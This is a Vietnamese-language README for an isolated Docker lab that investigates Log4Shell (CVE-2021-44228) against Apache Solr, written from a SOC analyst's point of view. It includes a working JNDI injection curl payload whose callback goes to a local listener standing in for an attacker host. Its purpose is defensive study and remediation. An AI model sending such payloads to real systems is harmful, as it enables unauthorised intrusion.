# Log4Shell Investigation Lab (CVE-2021-44228)

Điều tra khai thác lỗ hổng Log4Shell (CVE-2021-44228) trong môi trường lab cô lập, dựng bằng Docker, dựa trên [Vulhub](https://github.com/vulhub/vulhub). 
Mục tiêu: hiểu cơ chế lỗ hổng, tự tay khai thác, thu thập và đối chiếu bằng chứng từ nhiều nguồn, dựng timeline điều tra — mô phỏng quy trình phân tích của một SOC Analyst.

MITRE ATT&CK: T1190 — Exploit Public-Facing Application

---

## Tóm tắt

Môi trường mục tiêu: Apache Solr 8.11.0 (nhúng Log4j 2.14.1, phiên bản dính lỗi). Đã thực hiện khai thác JNDI injection qua HTTP request, xác nhận lỗ hổng tồn tại và khai thác được bằng cách đối chiếu 3 nguồn bằng chứng độc lập: log ứng dụng, kết nối callback (Python listener tự viết), và network traffic (Wireshark).

Báo cáo đầy đủ: [`report/bao-cao-log4shell.md`](./report/bao-cao-log4shell.md)

## Kiến trúc lab

```
Máy cá nhân (Windows + Docker Desktop)
│
├── Container: Apache Solr 8.11.0 (ứng dụng dính lỗ hổng)
│     └── Expose port 8983
│
├── Script: listener.py (mô phỏng máy chủ kẻ tấn công, hứng callback JNDI)
│     └── Lắng nghe port 1389
│
└── Wireshark (bắt traffic trên interface loopback)
```

Máy tấn công và máy nạn nhân là cùng một máy vật lý, dùng `127.0.0.1` để mô phỏng kết nối callback trong môi trường lab cá nhân.

## Cách tái hiện lab

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/log4j/CVE-2021-44228
docker compose up -d
```

Xác nhận ứng dụng sống tại `http://localhost:8983`. Sau đó dùng script `lab-setup/listener.py` để lắng nghe callback, và gửi payload khai thác:

```bash
curl.exe -g 'http://localhost:8983/solr/admin/cores?foo=${jndi:ldap://127.0.0.1:1389/a}'
```

Chi tiết đầy đủ từng bước, bao gồm các lỗi kỹ thuật gặp phải và cách khắc phục (URL globbing của `curl`, đồng bộ timing của listener), xem tại Chương 3 trong báo cáo.

## Kết quả chính

| Hạng mục                 | Kết quả                                                                          |
| ------------------------ | -------------------------------------------------------------------------------- |
| Lỗ hổng xác nhận tồn tại | Có — kết nối callback được kích hoạt thành công                                  |
| Phương thức khai thác    | JNDI Lookup qua tham số HTTP (`foo=${jndi:ldap://...}`)                          |
| Bằng chứng               | Log ứng dụng, Python listener, Wireshark — đối chiếu khớp qua port nguồn `49283` |
| Khuyến nghị khắc phục    | Vá Log4j ≥ 2.17.1; hoặc `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`                       |

## Cấu trúc repo

```
├── report/            Báo cáo điều tra đầy đủ 
├── evidence/           Bằng chứng gốc: pcap, log, ảnh chụp màn hình
└── lab-setup/           Script dùng trong quá trình thực hiện
```

## Giới hạn & hướng phát triển

Lab dừng ở mức chứng minh kết nối callback thành công (SSRF-level), chưa triển khai đầy đủ chuỗi RCE hoàn chỉnh (chưa dựng LDAP/HTTP server giả phục vụ payload Java). Hướng phát triển tiếp theo: kiểm chứng biện pháp khắc phục (before/after với `LOG4J_FORMAT_MSG_NO_LOOKUPS`), mở rộng RCE hoàn chỉnh, tích hợp SIEM.

---
